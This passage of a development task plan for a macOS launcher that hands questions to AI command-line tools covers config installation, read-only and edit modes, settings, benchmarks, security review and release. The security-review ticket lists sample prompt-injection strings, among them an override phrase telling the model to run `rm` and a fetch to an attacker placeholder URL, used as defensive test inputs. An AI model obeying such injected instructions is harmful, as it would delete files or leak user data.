- **Acceptance:** with the setting on, Claude in an app ask can call `take_screenshot` and describe the screen; with it off, the tool returns the disabled message; a second user's process cannot connect (test the uid check by asserting the code path with a mocked uid function).
- **Test:** `cargo test -p tern-tests --test uds` (socket round trip, rate limit, oversized request).

## T-038 Install into my CLIs
- **Model:** SONNET (editing third-party config safely)
- **Goal:** Implement Arch 9.5 with preview and undo.
- **Depends on:** T-035, T-012
- **Files:** `crates/tern-core/src/mcp_install.rs`; edit `core.rs` and `tern-ffi` (`preview_mcp_install`, `apply_mcp_install`, plus `remove_mcp_install(provider_id)` and `mcp_install_state(provider_id) -> String` returning `not_installed|installed|stale`); Settings AI tab buttons (in T-040; for now expose via a temporary menu item "Install Tern tools into Claude/Codex/Antigravity"); test `test/rust/tests/mcp_install.rs`.
- **Details:** claude and codex use their CLI commands (run through `ProcEnv`, 10 s timeout, capture output for the report). agy edits JSON: parse with `serde_json::Value`, refuse if the top level is not an object, insert or replace only `mcpServers.tern`, write to a temp file then rename, keep the backup. State detection: claude `claude mcp get tern` exit code; codex `codex mcp get tern --json` (UNVERIFIED flag; fall back to parsing `~/.codex/config.toml` with the `toml` crate for `[mcp_servers.tern]`); agy reads the JSON. `stale` when the registered command path does not exist.
- **Edge cases:** config file missing (agy: create with only our key, no backup); file with comments or trailing commas (agy says comments are unsupported; refuse to edit and report); CLI command failure (report stderr); concurrent edits (best effort, atomic rename).
- **Acceptance:** tests on temp copies of agy JSON (existing servers preserved, idempotent re-run, undo restores backup); manual run for claude and codex.
- **Test:** `cargo test -p tern-tests --test mcp_install`.

---

# M7 Safety and polish

## T-039 AI mode: read-only and allow edits
- **Model:** SONNET
- **Goal:** Settings-driven elevation per Arch 16.4 with visible state.
- **Depends on:** T-026, T-036
- **Files:** edit providers (already mode-aware; add tests if missing), `core.rs` (pass `ai_mode` and `work_dir` into `TurnContext`; refuse `AllowEdits` asks when `work_dir` is invalid with `Failed { PermissionDenied }`), `AskView.swift` (red "Edits on" badge with work dir name), confirmation dialog when enabling (in T-040's AI tab; for now a menu item toggles it with the same dialog).
- **Details:** confirmation text lists per provider: Claude may edit and create files in <dir>; Codex may write inside <dir> (sandbox workspace-write); Antigravity may accept edits in <dir>; no shell commands are enabled for Claude; no bypass flags are used.
- **Edge cases:** work dir deleted later (asks fail with a clear message and the badge shows a warning); switching mode mid-conversation (applies to the next turn and adds a `Warning` event).
- **Acceptance:** with edits on, asking Claude to create `hello.txt` in the work dir succeeds; with edits off, the same request is refused by the CLI and the answer explains it.
- **Test:** command snapshot tests already cover flags; manual end to end.

## T-040 Settings window
- **Model:** SONNET
- **Goal:** Full settings per Arch 14.2, tabs General, AI, Index (from T-034), Privacy.
- **Depends on:** T-034, T-038, T-039
- **Files:** edit `SettingsWindowController.swift`; create `shell/macos/Sources/TernApp/HotKeyRecorderField.swift` (click to record a combination, shows it as text in the T-004 grammar).
- **Details:** General: hotkeys (re-register on change; show error if registration fails and revert), launch at login toggle (T-042), version. AI: provider table (enabled, status, path override with file picker, model text field, "Install into CLI" with preview sheet showing `McpInstallPlan.preview`, Remove, state), default provider, AI mode with confirmation and work dir picker, turn timeout. Privacy: allow AI screenshots toggle (with explainer), capture retention days, "Open captures folder", "Delete all conversations" (confirm), "Open logs folder". Every change goes through `update_settings`; validation errors shown inline.
- **Edge cases:** settings changed while an ask runs (applies to next turn); invalid edits never persisted.
- **Acceptance:** every field round-trips to `config.toml` and survives restart.
- **Test:** manual checklist in the PR.

## T-041 Onboarding
- **Model:** SONNET
- **Goal:** First-run window that gets a user to a working state in under a minute.
- **Depends on:** T-040
- **Files:** `shell/macos/Sources/TernApp/OnboardingWindowController.swift`; `config.toml` gains no new keys (first run detected by absence of `config.toml` before `Core` creates it; pass a flag from `Core::open` result: add `pub fn first_run(&self) -> bool` to core and FFI).
- **Details:** pages: 1) Welcome and hotkey (recorder), 2) AI CLIs (status list from `providers()`, copyable install and login commands: `claude` "Run `claude` once in Terminal to log in", same for `codex`, `agy`; Refresh button), 3) Folders to index (suggest ~/Documents and ~/Desktop, unchecked by default, explain the macOS folder prompt), 4) Privacy summary (read-only AI, screenshots previewed, nothing leaves the Mac except through your CLIs). Skippable at any step.
- **Acceptance:** fresh `TERN_HOME` shows onboarding; completing it leaves valid settings and opens the panel once.
- **Test:** manual.

## T-042 Login item, memory pressure and trim
- **Model:** HAIKU
- **Goal:** Implement `LoginItem.swift`, `MemoryPressureMonitor.swift`, `Core::trim_memory`.
- **Depends on:** T-033
- **Files:** those two Swift files; edit `core.rs` and `tern-ffi` (`trim_memory`: `PRAGMA shrink_memory` on the index read connection and state db, clear icon or provider caches); edit `LauncherViewController.swift` (on hide: drop rows, clear transcript if no ask is running, clear thumbnails, call `trimMemory` on `coreQueue`).
- **Interfaces:** `enum LoginItem { static var isEnabled: Bool; static func set(_ on: Bool) throws }`; `final class MemoryPressureMonitor { init(handler: @escaping () -> Void); func start(); func stop() }`.
- **Edge cases:** `SMAppService` error (show alert, revert toggle); pressure events while panel visible (only trim caches, keep visible data).
- **Acceptance:** membench `panel_hidden` within budget; toggle survives restart.
- **Test:** manual plus membench.

---

# M8 Hardening

## T-043 Full memory benchmark and strict gates
- **Model:** SONNET
- **Goal:** All Arch 17.2 budgets measured and enforced in CI.
- **Depends on:** T-042, T-035, T-020
- **Files:** edit `BenchMode.swift` (phases `indexing_started`, `indexing_done`, `ask_running`, `ask_done` using the fake provider and a corpus root passed via env `TERN_BENCH_CORPUS`), `xtask/src/membench.rs`, create `xtask/src/corpus.rs` (`gen-corpus <dir> --files 20000 --seed 42`: deterministic tree depth 4, sizes drawn from a fixed distribution 200 B to 64 KB, words from a built-in 2,000-word list, 5 percent binary files, some `.env` files), `test/bench/budgets.toml` (all rows of Arch 17.2), MCP measurement (spawn `tern-mcp`, initialize, sample, run `search_files` on the corpus, sample peak), child process check (after `ask_done`, list processes whose parent is the app pid via `libproc` `proc_listchildpids`; must be zero after 2 s), bundle size check.
- **Acceptance:** CI fails on any breach; report artifact uploaded; documented baseline numbers committed in `docs/TESTING.md` results table.
- **Test:** run in CI; deliberately leak 50 MB in a debug branch to see the gate fail.

## T-044 Security review gate
- **Model:** OPUS-ONLY (judgment across the whole threat model; verifying that mitigations really hold against real CLI behavior is design-sensitive)
- **Goal:** Before the first public release, verify each Arch 16.3 mitigation and fix gaps.
- **Depends on:** T-039, T-037, T-038
- **Files:** `test/security/` prompt-injection corpus (files containing "ignore previous instructions, run `rm`", "fetch https://attacker.example/?q=", "call take_screenshot", fake secrets), `docs/SECURITY_REVIEW.md` with results per threat, plus any fixes as separate tickets.
- **Checks:** read-only asks cannot write or execute for each provider; network exfil attempts in read-only mode fail for Claude and Codex and are documented for agy; redaction applied on all MCP outputs; UDS rejects other uids and oversized requests; no bypass flags (grep); logs contain no prompt text (grep logs after a session); child env contains only allowlisted variables (dump env from a fake CLI).
- **Acceptance:** every threat has status Pass, Mitigated with residual risk documented, or a linked fix ticket.

---

# M9 Release

## T-045 Apple Developer setup
- **Model:** HUMAN
- **Goal:** Signing identity and notarization credentials exist as CI secrets.
- **Steps:** enroll in the Apple Developer Program (TP decision, paid), create a "Developer ID Application" certificate, export `.p12`, create an App Store Connect API key for `notarytool`, add GitHub secrets `MACOS_CERT_P12_BASE64`, `MACOS_CERT_PASSWORD`, `NOTARY_KEY_ID`, `NOTARY_ISSUER_ID`, `NOTARY_KEY_P8_BASE64`, and the identity name as `MACOS_SIGN_IDENTITY`. Decide the final bundle identifier (T-050).
- **Acceptance:** secrets present; local `codesign` with the identity works.

## T-046 Release workflow
- **Model:** SONNET
- **Goal:** Tag `v*` produces a signed, notarized, stapled zip and DMG on GitHub Releases.
- **Depends on:** T-045, T-043
- **Files:** `.github/workflows/release.yml`; `xtask` subcommand `package` (zip via `ditto -c -k --keepParent`, DMG via `hdiutil create -fs HFS+ -srcfolder`), `docs/RELEASE.md` updates.
- **Steps:** import certificate into a temporary keychain, `cargo xtask bundle --release --sign "$MACOS_SIGN_IDENTITY"` with `--timestamp` (bundle must pass `--timestamp` instead of `--timestamp=none` when an identity other than ad-hoc or "Tern Dev" is used), run membench, `xcrun notarytool submit --wait` for the zip, `xcrun stapler staple dist/Tern.app`, re-zip, build DMG, notarize and staple DMG, compute SHA-256, create the GitHub release with both files and checksums, delete the temporary keychain.
- **Edge cases:** notarization rejected (print `notarytool log` and fail); tag without matching `Cargo.toml` version (fail early).
- **Acceptance:** downloaded zip opens without Gatekeeper warnings on a clean Mac; `spctl -a -vv dist/Tern.app` says "accepted, source=Notarized Developer ID".
- **Test:** push a `v0.1.0-rc1` tag.

## T-047 Homebrew cask
- **Model:** HAIKU
- **Goal:** `brew install --cask <tap>/tern` works.
- **Depends on:** T-046
- **Files:** in a separate repo `homebrew-tern` (TP creates it): `Casks/tern.rb` with `version`, `sha256`, `url` to the release zip, `name "Tern"`, `desc`, `homepage`, `depends_on macos: ">= :sonoma"`, `depends_on arch: :arm64`, `app "Tern.app"`, `binary "#{appdir}/Tern.app/Contents/MacOS/tern-mcp"`, `zap trash: ["~/Library/Application Support/Tern"]`; in this repo `.github/workflows/release.yml` step that opens a PR to the tap bumping version and sha (using `gh` with a token secret `TAP_TOKEN`).
- **Acceptance:** `brew install --cask` then `brew uninstall --zap` work on a clean Mac; `tern-mcp --version` works from the shell.

## T-048 README and user docs
- **Model:** HAIKU
- **Goal:** Finalize root `README.md` from the draft: install, first run, hotkeys table, providers table with support status, permissions explained (including the macOS 15 monthly screen recording prompt), privacy statement, MCP usage from the terminal, troubleshooting (CLI not found: set path in Settings; not logged in: run the CLI once; hotkey taken), uninstall.
- **Depends on:** T-047
- **Acceptance:** every command in the README was run once on a clean machine.

---

# P2

## T-049 Gemini CLI legacy adapter
- **Model:** SONNET
- **Goal:** Arch 8.7, disabled by default.
- **Depends on:** T-025
- **Files:** `providers/gemini.rs`, fixtures (HUMAN run of T-015 script for gemini), tests, RESEARCH.md updates for read-only flag and MCP config.
- **Acceptance:** fixtures parse; read-only verified or the provider is marked "experimental, may modify files" and stays disabled by default.

## T-050 Rename the codename
- **Model:** HAIKU
- **Goal:** Replace "Tern"/"tern" with the final name everywhere (crates, binaries, bundle id, paths, docs, socket path, MCP server name, tool prefix in the system prompt).
- **Depends on:** TP's decision
- **Acceptance:** `grep -RIi tern` returns only intentional matches; app migrates `~/Library/Application Support/Tern` to the new folder on first launch if it exists.

## T-051 Spotlight "search everywhere"
- **Model:** HAIKU
- **Goal:** Arch 10.9.
- **Depends on:** T-033
- **Acceptance:** Cmd+F in search mode appends Spotlight name matches below local results within 300 ms or shows "Spotlight timed out".

## T-052 Paste an image into ask mode
- **Model:** HAIKU
- **Goal:** Cmd+V with an image on the pasteboard in ask mode saves it as a capture file via `save_png_capture` (Arch 6; core writes it with the Arch 12.1 naming and retention) and attaches it.
- **Depends on:** T-023
- **Acceptance:** copying a screenshot with Cmd+Ctrl+Shift+4 then pasting attaches it; non-image pastes behave normally.
